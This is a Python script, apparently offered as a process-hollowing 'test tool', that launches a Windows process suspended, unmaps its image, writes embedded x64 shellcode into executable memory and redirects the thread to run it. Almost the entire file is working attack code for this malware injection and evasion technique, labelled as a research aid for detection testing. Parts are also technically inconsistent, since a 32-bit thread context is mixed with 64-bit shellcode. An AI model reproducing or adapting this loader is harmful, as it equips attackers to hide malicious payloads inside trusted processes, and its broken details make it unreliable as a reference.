import ctypes
import ctypes.wintypes
import struct
import sys
import time
from ctypes import windll, byref, sizeof, c_void_p, c_uint32, c_ulong

# Windows API constants
CREATE_SUSPENDED = 0x4
CONTEXT_FULL = 0x10007
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", ctypes.wintypes.DWORD),
        ("lpReserved", ctypes.wintypes.LPWSTR),
        ("lpDesktop", ctypes.wintypes.LPWSTR),
        ("lpTitle", ctypes.wintypes.LPWSTR),
        ("dwX", ctypes.wintypes.DWORD),
        ("dwY", ctypes.wintypes.DWORD),
        ("dwXSize", ctypes.wintypes.DWORD),
        ("dwYSize", ctypes.wintypes.DWORD),
        ("dwXCountChars", ctypes.wintypes.DWORD),
        ("dwYCountChars", ctypes.wintypes.DWORD),
        ("dwFillAttribute", ctypes.wintypes.DWORD),
        ("dwFlags", ctypes.wintypes.DWORD),
        ("wShowWindow", ctypes.wintypes.WORD),
        ("cbReserved2", ctypes.wintypes.WORD),
        ("lpReserved2", ctypes.POINTER(ctypes.wintypes.BYTE)),
        ("hStdInput", ctypes.wintypes.HANDLE),
        ("hStdOutput", ctypes.wintypes.HANDLE),
        ("hStdError", ctypes.wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", ctypes.wintypes.HANDLE),
        ("hThread", ctypes.wintypes.HANDLE),
        ("dwProcessId", ctypes.wintypes.DWORD),
        ("dwThreadId", ctypes.wintypes.DWORD),
    ]

class CONTEXT(ctypes.Structure):
    _fields_ = [
        ("ContextFlags", ctypes.wintypes.DWORD),
        ("Dr0", ctypes.wintypes.DWORD),
        ("Dr1", ctypes.wintypes.DWORD),
        ("Dr2", ctypes.wintypes.DWORD),
        ("Dr3", ctypes.wintypes.DWORD),
        ("Dr6", ctypes.wintypes.DWORD),
        ("Dr7", ctypes.wintypes.DWORD),
        ("FloatSave", ctypes.c_byte * 112),
        ("SegGs", ctypes.wintypes.DWORD),
        ("SegFs", ctypes.wintypes.DWORD),
        ("SegEs", ctypes.wintypes.DWORD),
        ("SegDs", ctypes.wintypes.DWORD),
        ("Edi", ctypes.wintypes.DWORD),
        ("Esi", ctypes.wintypes.DWORD),
        ("Ebx", ctypes.wintypes.DWORD),
        ("Edx", ctypes.wintypes.DWORD),
        ("Ecx", ctypes.wintypes.DWORD),
        ("Eax", ctypes.wintypes.DWORD),
        ("Ebp", ctypes.wintypes.DWORD),
        ("Eip", ctypes.wintypes.DWORD),
        ("SegCs", ctypes.wintypes.DWORD),
        ("EFlags", ctypes.wintypes.DWORD),
        ("Esp", ctypes.wintypes.DWORD),
        ("SegSs", ctypes.wintypes.DWORD),
    ]

class ProcessHollowing:
    def __init__(self):
        self.pi = PROCESS_INFORMATION()
        self.si = STARTUPINFO()
        self.ctx = CONTEXT()
        self.si.cb = sizeof(STARTUPINFO)
        self.ctx.ContextFlags = CONTEXT_FULL
        self.image_base = None
        self.hollow_address = None

    def create_suspended_process(self, target_path):
        """Create a new process in suspended state"""
        print(f"[+] Creating suspended process: {target_path}")

        result = windll.kernel32.CreateProcessW(
            target_path,
            None,
            None,
            None,
            False,
            CREATE_SUSPENDED,
            None,
            None,
            byref(self.si),
            byref(self.pi)
        )

        if not result:
            error = windll.kernel32.GetLastError()
            print(f"[-] Failed to create suspended process. Error: {error}")
            return False

        print(f"[+] Process created successfully. PID: {self.pi.dwProcessId}")
        return True

    def get_thread_context(self):
        """Get the thread context of the suspended process"""
        print("[+] Getting thread context...")

        result = windll.kernel32.GetThreadContext(self.pi.hThread, byref(self.ctx))
        if not result:
            error = windll.kernel32.GetLastError()
            print(f"[-] Failed to get thread context. Error: {error}")
            return False

        print("[+] Thread context retrieved successfully")
        return True

    def get_image_base(self):
        """Read the image base address from the PEB"""
        print("[+] Reading image base from PEB...")

        # PEB address is in EBX register
        peb_address = self.ctx.Ebx

        # Read image base from PEB+8
        image_base_buffer = ctypes.c_void_p()
        bytes_read = ctypes.c_size_t()

        result = windll.kernel32.ReadProcessMemory(
            self.pi.hProcess,
            ctypes.c_void_p(peb_address + 8),
            byref(image_base_buffer),
            sizeof(ctypes.c_void_p),
            byref(bytes_read)
        )

        if not result:
            error = windll.kernel32.GetLastError()
            print(f"[-] Failed to read image base from PEB. Error: {error}")
            return False

        self.image_base = image_base_buffer.value
        print(f"[+] Image base: 0x{self.image_base:x}")
        return True

    def unmap_target_image(self):
        """Unmap the original executable from memory"""
        print("[+] Unmapping target image...")

        # Get NtUnmapViewOfSection from ntdll
        ntdll = windll.ntdll

        # Call NtUnmapViewOfSection
        status = ntdll.NtUnmapViewOfSection(self.pi.hProcess, ctypes.c_void_p(self.image_base))

        if status != 0:
            print(f"[-] Failed to unmap view of section. Status: 0x{status:x}")
            return False

        print("[+] Target image unmapped successfully")
        return True

    def allocate_memory(self, size):
        """Allocate memory in the target process"""
        print("[+] Allocating memory for payload...")

        # Try to allocate at original image base first
        self.hollow_address = windll.kernel32.VirtualAllocEx(
            self.pi.hProcess,
            ctypes.c_void_p(self.image_base),
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )

        if not self.hollow_address:
            # If that fails, allocate anywhere
            self.hollow_address = windll.kernel32.VirtualAllocEx(
                self.pi.hProcess,
                None,
                size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )

            if not self.hollow_address:
                error = windll.kernel32.GetLastError()
                print(f"[-] Failed to allocate memory. Error: {error}")
                return False

            print(f"[+] Allocated at alternative address: 0x{self.hollow_address:x}")
        else:
            print(f"[+] Memory allocated at original base: 0x{self.hollow_address:x}")

        return True

    def write_payload(self, payload):
        """Write the payload to allocated memory"""
        print("[+] Writing payload to allocated memory...")

        bytes_written = ctypes.c_size_t()
        result = windll.kernel32.WriteProcessMemory(
            self.pi.hProcess,
            ctypes.c_void_p(self.hollow_address),
            payload,
            len(payload),
            byref(bytes_written)
        )

        if not result:
            error = windll.kernel32.GetLastError()
            print(f"[-] Failed to write payload. Error: {error}")
            return False

        print(f"[+] Payload written successfully. Bytes: {bytes_written.value}")
        return True

    def update_image_base(self):
        """Update the image base in the PEB"""
        print("[+] Updating image base in PEB...")

        peb_address = self.ctx.Ebx
        new_base = struct.pack('<L', self.hollow_address)
        bytes_written = ctypes.c_size_t()

        result = windll.kernel32.WriteProcessMemory(
            self.pi.hProcess,
            ctypes.c_void_p(peb_address + 8),
            new_base,
            sizeof(ctypes.c_void_p),
            byref(bytes_written)
        )

        if not result:
            error = windll.kernel32.GetLastError()
            print(f"[-] Failed to update image base. Error: {error}")
            return False

        print("[+] Image base updated successfully")
        return True

    def update_entry_point(self, entry_offset=0):
        """Update the entry point to point to our payload"""
        print("[+] Updating entry point...")

        self.ctx.Eax = self.hollow_address + entry_offset

        result = windll.kernel32.SetThreadContext(self.pi.hThread, byref(self.ctx))
        if not result:
            error = windll.kernel32.GetLastError()
            print(f"[-] Failed to set thread context. Error: {error}")
            return False

        print(f"[+] Entry point updated to: 0x{self.ctx.Eax:x}")
        return True

    def resume_execution(self):
        """Resume the suspended thread"""
        print("[+] Resuming thread execution...")

        result = windll.kernel32.ResumeThread(self.pi.hThread)
        if result == -1:
            error = windll.kernel32.GetLastError()
            print(f"[-] Failed to resume thread. Error: {error}")
            return False

        print("[+] Thread resumed successfully")
        return True

    def cleanup(self):
        """Clean up handles"""
        if self.pi.hProcess:
            windll.kernel32.CloseHandle(self.pi.hProcess)
        if self.pi.hThread:
            windll.kernel32.CloseHandle(self.pi.hThread)

def main():
    print("=== Process Hollowing Test Tool (Python) ===")
    print("[!] This is for security research and testing only!")
    print()

    target_path = r"C:\Windows\System32\notepad.exe"
    if len(sys.argv) > 1:
        target_path = sys.argv[1]

    # Simple calc.exe shellcode for testing
    payload = bytearray([
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
        0x63, 0x00
    ])

    hollowing = ProcessHollowing()

    try:
        # Execute process hollowing steps
        if not hollowing.create_suspended_process(target_path):
            return 1

        if not hollowing.get_thread_context():
            return 1

        if not hollowing.get_image_base():
            return 1

        if not hollowing.unmap_target_image():
            return 1

        if not hollowing.allocate_memory(len(payload)):
            return 1

        if not hollowing.write_payload(payload):
            return 1

        if not hollowing.update_image_base():
            return 1

        if not hollowing.update_entry_point():
            return 1

        print(f"[!] About to resume execution. PID: {hollowing.pi.dwProcessId}")
        input("[!] Press Enter to continue...")

        if not hollowing.resume_execution():
            return 1

        print("[+] Process hollowing completed successfully!")
        print(f"[+] Monitor PID {hollowing.pi.dwProcessId} with your detection tools")

        # Keep the program running
        input("[+] Press Enter to exit...")

    except Exception as e:
        print(f"[-] Error: {e}")
        return 1
    finally:
        hollowing.cleanup()

    return 0

if __name__ == "__main__":
    sys.exit(main())